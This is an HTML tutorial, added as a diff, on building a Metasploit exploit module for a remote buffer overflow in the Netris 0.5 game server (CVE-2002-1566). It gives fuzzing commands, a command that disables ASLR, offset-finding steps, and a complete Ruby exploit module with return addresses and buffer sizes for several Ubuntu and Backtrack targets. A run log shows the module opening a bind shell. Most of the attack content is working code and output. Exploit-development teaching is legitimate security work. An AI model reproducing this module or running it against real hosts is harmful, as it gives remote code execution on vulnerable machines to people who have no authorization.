@@ -1,0 +1,513 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+
+<!--Converted with LaTeX2HTML 2002-2-1 (1.71)
+original version by:  Nikos Drakos, CBLU, University of Leeds
+* revised and updated by:  Marcus Hennecke, Ross Moore, Herb Swan
+* with significant contributions from:
+  Jens Lippmann, Marek Rouchal, Martin Wilck and others -->
+<HTML>
+<HEAD>
+<TITLE>msf3tut</TITLE>
+<META NAME="description" CONTENT="msf3tut">
+<META NAME="keywords" CONTENT="msf3tut">
+<META NAME="resource-type" CONTENT="document">
+<META NAME="distribution" CONTENT="global">
+
+<META NAME="Generator" CONTENT="LaTeX2HTML v2002-2-1">
+<META HTTP-EQUIV="Content-Style-Type" CONTENT="text/css">
+
+<LINK REL="STYLESHEET" HREF="msf3tut.css">
+
+</HEAD>
+
+<BODY >
+
+<P>
+
+<BR>
+<BR>
+<BR>
+<BR>
+<BR>
+<BR>
+<BR>
+<BR>
+<BR>
+<BR>
+    <DIV ALIGN="CENTER">
+<BIG CLASS="XXLARGE">Developing an Exploit Using the Metasploit Framework
+        
+<BR>        <BR>
+<BR>
+<BR>
+<BR>
+<BR>
+<BR>
+<BR>
+    
+</BIG></DIV>
+
+<P>
+<BR>
+
+<H2><A NAME="SECTION00010000000000000000">
+Contents</A>
+</H2>
+<!--Table of Contents-->
+
+<UL CLASS="TofC">
+<LI><A NAME="tex2html11"
+  HREF="msf3tut.html#SECTION00020000000000000000">Introduction</A>
+<LI><A NAME="tex2html12"
+  HREF="msf3tut.html#SECTION00030000000000000000">The Vulnerability</A>
+<LI><A NAME="tex2html13"
+  HREF="msf3tut.html#SECTION00040000000000000000">Getting Started</A>
+<LI><A NAME="tex2html14"
+  HREF="msf3tut.html#SECTION00050000000000000000">On to the Framework</A>
+<LI><A NAME="tex2html15"
+  HREF="msf3tut.html#SECTION00060000000000000000">Taking Over</A>
+<LI><A NAME="tex2html16"
+  HREF="msf3tut.html#SECTION00070000000000000000">Wrap It Up</A>
+</UL>
+<!--End of Table of Contents-->
+
+<P>
+
+<H1><A NAME="SECTION00020000000000000000">
+Introduction</A>
+</H1>
+
+<P>
+In this tutorial, I will show you how to create an exploit module for
+the Metasploit Framework starting from a vulnerability report.
+
+<P>
+
+<H1><A NAME="SECTION00030000000000000000">
+The Vulnerability</A>
+</H1>
+
+<P>
+The program I chose to exploit is Netris 0.5.  I chose this because it's
+vulnerability is a simple buffer overflow, it is remote, and there is
+already a working exploit out there that we can use as a starting point.
+You can reference this vulnerability
+here<A NAME="tex2html1"
+  HREF="#foot15"><SUP><SPAN CLASS="arabic">1</SPAN></SUP></A> Note that this
+vulnerability applies only to version 0.5.
+
+<P>
+
+<H1><A NAME="SECTION00040000000000000000">
+Getting Started</A>
+</H1>
+
+<P>
+First off, get the source for Netris 0.5.  You can get it
+here<A NAME="tex2html2"
+  HREF="#foot17"><SUP><SPAN CLASS="arabic">2</SPAN></SUP></A>.  Compile it, and make
+sure it runs without error.  
+
+<P>
+The released exploit for this explains that our buffer should look like this:
+
+<P>
+<PRE>
+[68 filler bytes][nops][shellcode][return address]
+</PRE>
+
+<P>
+However, lets begin with something a little more simple.  Let's see what
+happens when we send a whole bunch of "A"s at the Netris server.
+
+<P>
+In one shell:
+
+<P>
+<PRE>
+$ gdb netris
+</PRE>
+
+<P>
+Now you are in gdb and ready to run Netris.  From the gdb prompt, start the
+server:
+
+<P>
+<PRE>
+(gdb) run -w
+</PRE>
+
+<P>
+Now, in another shell:
+
+<P>
+<PRE>
+$ ruby -e 'print "A"*16000'| nc localhost 9284
+</PRE>
+
+<P>
+You may need to <code>ctrl+c</code> out of netcat, but when that is done, take a look at
+your gdb session.  It should look like this:
+
+<P>
+<PRE>
+  Program received signal SIGSEGV, Segmentation fault.
+  0x41414141 in ?? ()
+</PRE>
+
+<P>
+This is prefect.  What this shows is that we just overwrote the instruction
+pointer <code>($eip)</code> to <code>0x41414141</code>, which is hex for <code>AAAA</code>.
+
+<P>
+Since we can control the instruction pointer, we can control the flow of this
+program.  From here on out, you may need to set your kernel to not use
+randomized virtual addressing.  You can do this with sysctrl using the
+following command:
+
+<P>
+<PRE>
+$ sudo sysctl -w kernel.randomize_va_space=0
+</PRE>
+
+<P>
+This is so the buffer will be stored in relatively the same place each time,
+allowing us to return into it.
+
+<P>
+
+<H1><A NAME="SECTION00050000000000000000">
+On to the Framework</A>
+</H1>
+
+<P>
+First, start out with a relatively generic exploit script.  You can just copy
+one of the Linux exploits under <code>modules/exploits/linux</code> to get started.
+
+<P>
+<PRE>
+require 'msf/core'
+
+module Msf
+
+class Exploits::Mine::Netris &lt; Msf::Exploit::Remote
+
+    include Exploit::Remote::Tcp
+
+    def initialize(info = {})
+        super(update_info(info,
+            'Name'           =&gt; 'Netris 0.5 Buffer Overflow (Linux)',
+            'Description'    =&gt; %q{
+                      Netris 0.5 exploit.  
+                Discovery of this issue is credited to Artur Byszko / bajkero.    
+            },
+            'Version'     =&gt; '0.1.0',
+            'Author'         =&gt; ['dougsko'],
+            'License'        =&gt; GPL_LICENSE,
+            'References'     =&gt;
+                [
+                    [ 'BID', '5680'], 
+                    [ 'CVE', '2002-1566' ],
+                    [ 'URL', 'http://securityvulns.com/files/netrisx.c' ],
+                    [ 'URL', 'http://xforce.iss.net/xforce/xfdb/10081' ],
+                ],
+            'Privileged'     =&gt; false,
+            'Payload'     =&gt;
+                {
+                    'Space' =&gt; 1024,
+
+                },
+            'Platform'    =&gt; ['linux'],
+            'Targets'    =&gt;
+                [
+                    [ 'Ubuntu 8.04',
+                        { 'Ret'        =&gt; 0x80522b0,
+                          'Arch'    =&gt; [ARCH_X86 ],
+                          'BufSize'    =&gt; 9692,
+                        }
+                    ],
+                    
+                ],
+            'DisclosureDate' =&gt; '08/14/2003',
+            'DefaultTarget'  =&gt; 0 ))
+
+            register_options( [ Opt::RPORT(9284) ], self.class)
+    end
+
+    def exploit
+    end
+end    
+end
+</PRE>
+
+<P>
+Notice that I have already filled in some of the specific information about
+this exploit.  The next big piece of info that we need is the return address.
+We need an address that will point back to somewhere within our buffer.
+Finding this address can be a little tricky, but here's how I did it:
+
+<P>
+
+<UL>
+<LI>Run Netris in gdb.
+</LI>
+<LI>Overflow it with a bunch of "A"s.
+</LI>
+<LI>Take a look at the netBuf function, since this is near
+where the overflow is happening.  (You did read the vulnerability notes
+right...?)
+</LI>
+</UL>
+
+<P>
+<PRE>
+(gdb) x/20s netBuf
+0x8052260 &lt;netBuf&gt;:      'A' &lt;repeats 64 times&gt;
+0x80522a1 &lt;netBufSize+1&gt;:        ""
+0x80522a2 &lt;netBufSize+2&gt;:        ""
+0x80522a3 &lt;netBufSize+3&gt;:        ""
+0x80522a4 &lt;isServer&gt;:    'A' &lt;repeats 200 times&gt;...
+0x805236c:       'A' &lt;repeats 200 times&gt;...
+0x8052434 &lt;opponentHost+116&gt;:    'A' &lt;repeats 200 times&gt;...
+0x80524fc &lt;scratch+28&gt;:  'A' &lt;repeats 200 times&gt;...
+0x80525c4 &lt;scratch+228&gt;:         'A' &lt;repeats 200 times&gt;...
+0x805268c &lt;scratch+428&gt;:         'A' &lt;repeats 200 times&gt;...
+0x8052754 &lt;scratch+628&gt;:         'A' &lt;repeats 200 times&gt;...
+0x805281c &lt;scratch+828&gt;:         'A' &lt;repeats 200 times&gt;...
+0x80528e4 &lt;curShape&gt;:    'A' &lt;repeats 200 times&gt;...
+0x80529ac:       'A' &lt;repeats 200 times&gt;...
+0x8052a74:       'A' &lt;repeats 200 times&gt;...
+0x8052b3c:       'A' &lt;repeats 200 times&gt;...
+0x8052c04:       'A' &lt;repeats 200 times&gt;...
+0x8052ccc:       'A' &lt;repeats 200 times&gt;...
+0x8052d94:       'A' &lt;repeats 200 times&gt;...
+0x8052e5c:       'A' &lt;repeats 200 times&gt;...
+</PRE>
+
+<P>
+Notice that after <code>0x80529ac</code>, memory is basically filled with our
+<code>A</code>'s.  I just picked a random address somewhere after that and
+used <code>0x80522b0</code>.  This is OK, since we'll be using a large NOP
+sled we won't have to be very accurate when it comes to the return
+address.  The next step is to find out just how long our buffer needs to
+be in order to overflow the buffer, but still overwrite the EIP register
+properly with out return address.
+
+<P>
+To do this, we'll use the scripts patter_create.rb, and pattern_offset.rb under
+the tools folder.  First, start up Netris in gdb again:
+
+<P>
+<PRE>
+  $ gdb netris
+  (gdb) run -w
+</PRE>
+
+<P>
+In another shell use the pattern_create.rb script to create your overflow
+string:
+
+<P>
+<code>./pattern_create.rb 16000| nc localhost 9284</code>
+
+<P>
+This will cause an overflow:
+
+<P>
+<PRE>
+  Program received signal SIGSEGV, Segmentation fault.
+  0x316c4d30 in ?? ()
+</PRE>
+
+<P>
+Now, we see that the EIP has been overwritten with <code>0x316c4d30</code>,
+which is the pattern of letters that we sent to the server.  To find
+just how big of a buffer it took to do this, we use pattern_offset.rb:
+
+<P>
+<PRE>
+  ./pattern_offset.rb 0x316c4d30 16000 
+  9692
+</PRE>
+
+<P>
+We see that our buffer size should be 9692 bytes long.  Put that into the
+target definition in our exploit module.  We are now ready to get down to
+business.
+
+<P>
+
+<H1><A NAME="SECTION00060000000000000000">
+Taking Over</A>
+</H1>
+
+<P>
+All we have to do now is define our exploit method in the module we are
+writing.
+
+<P>
+<PRE>
+def exploit
+                print_status("Generating buffer")
+                buf = make_nops(target['BufSize'] - payload.encoded.length) + payload.encoded + [target.ret].pack('V')
+                
+                print_status("Sending \#{buf.size} byte buffer...")
+                connect
+                sock.put(buf)
+                sock.get
+                handler
+                disconnect
+        end
+</PRE>
+
+<P>
+This sets up our attack buffer like so:
+
+<P>
+<PRE>
+[NOPs][shellcode][return address] total: 9692 bytes
+</PRE>
+
+<P>
+Then, we send it out with <code>sock.put(buf)</code>.  The framework really takes care of
+most of the other details involved, including shellcode generation.  Here is
+what my final exploit module looks like:
+
+<P>
+<PRE>
+require 'msf/core'
+
+module Msf
+
+class Exploits::Mine::Netris &lt; Msf::Exploit::Remote
+
+    include Exploit::Remote::Tcp
+
+    def initialize(info = {})
+        super(update_info(info,
+            'Name'           =&gt; 'Netris 0.5 Buffer Overflow (Linux)',
+            'Description'    =&gt; %q{
+                      Netris 0.5 exploit.  
+                Discovery of this issue is credited to Artur Byszko / bajkero.    
+            },
+            'Version'     =&gt; '0.1.0',
+            'Author'         =&gt; ['dougsko'],
+            'License'        =&gt; GPL_LICENSE,
+            'References'     =&gt;
+                [
+                    [ 'BID', '5680'], 
+                    [ 'CVE', '2002-1566' ],
+                    [ 'URL', 'http://securityvulns.com/files/netrisx.c' ],
+                    [ 'URL', 'http://xforce.iss.net/xforce/xfdb/10081' ],
+                ],
+            'Privileged'     =&gt; false,
+            'Payload'     =&gt;
+                {
+                    'Space' =&gt; 1024,
+
+                },
+            'Platform'    =&gt; ['linux'],
+            'Targets'    =&gt;
+                [
+                    [ 'Ubuntu 6.06', 
+                        { 'Ret'        =&gt; 0x80544f0,
+                          'Arch'    =&gt; [ ARCH_X86 ],          
+                          'BufSize'    =&gt; 11552,
+                        } 
+                    ],
+                    
+                    [  'Ubuntu 7.04',
+                          { 'Ret'        =&gt; 0x80544f0,
+                                'Arch'        =&gt; [ ARCH_X86 ],
+                            'BufSize'     =&gt; 12148,
+                        }
+                    ],  
+
+                    [ 'Ubuntu 8.04',
+                        { 'Ret'        =&gt; 0x80522b0,
+                          'Arch'    =&gt; [ARCH_X86 ],
+                          'BufSize'    =&gt; 9692,
+                        }
+                    ],
+                    
+                    [  'Backtrack 2',
+                        { 'Ret'         =&gt; 0x80544f0,
+                          'Arch'        =&gt; [ ARCH_X86 ],
+                            'BufSize'     =&gt; 12120,
+                        }      
+                                  
+                    ],
+
+                ],
+            'DisclosureDate' =&gt; '08/14/2003',
+            'DefaultTarget'  =&gt; 0 ))
+
+            register_options( [ Opt::RPORT(9284) ], self.class)
+    end
+
+    def exploit
+        print_status("Generating buffer")
+        #buf = pattern_create(16000) # debug
+        #buf = "A"*(target['BufSize'] +4)
+        buf = make_nops(target['BufSize'] - payload.encoded.length) + payload.encoded + [target.ret].pack('V')
+
+        print_status("Sending \#{buf.size} byte buffer...")
+        connect
+        sock.put(buf)
+        sock.get
+        handler
+        disconnect
+    end
+end    
+end
+</PRE>
+
+<P>
+Make a folder called <code>mine</code> under <code>modules/exploits/</code>, and put that file in it.
+Here is what it looks like when you run the exploit.  Note that I am running
+the Netris server as user <code>doug</code>.
+
+<P>
+<PRE>
+./msfcli mine/netris rhost=localhost target=2 payload=linux/x86/shell_bind_tcp E
+
+[*] Started bind handler
+[*] Generating buffer
+[*] Sending 9696 byte buffer...
+[*] Command shell session 1 opened (127.0.0.1:36044 -&gt; 127.0.0.1:4444)
+
+id
+uid=1000(doug) gid=1000(doug) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),127(mythtv),1000(doug)
+</PRE>
+
+<P>
+
+<H1><A NAME="SECTION00070000000000000000">
+Wrap It Up</A>
+</H1>
+
+<P>
+So that's it.  We just went from vulnerability report to a working exploit.  I
+seem to have the best luck using the <code>linux/x86/shell_bind_tcp</code> payload.  I
+hope that helps make using the MSF a little less daunting and shows you just
+how powerful it can be.  Have fun!
+
+<P>
+
+<BR><HR><H4>Footnotes</H4>
+<DL>
+<DT><A NAME="foot15">...
+here</A><A
+ HREF="msf3tut.html#tex2html1"><SUP><SPAN CLASS="arabic">1</SPAN></SUP></A></DT>
+<DD>http://www.securityfocus.com/bid/5680
+
+</DD>
+<DT><A NAME="foot17">...
+here</A><A
+ HREF="msf3tut.html#tex2html2"><SUP><SPAN CLASS="arabic">2</SPAN></SUP></A></DT>
+<DD>ftp://ftp.netris.org/pub/netris/
+
+</DD>
+</DL>
+</BODY>
+</HTML>
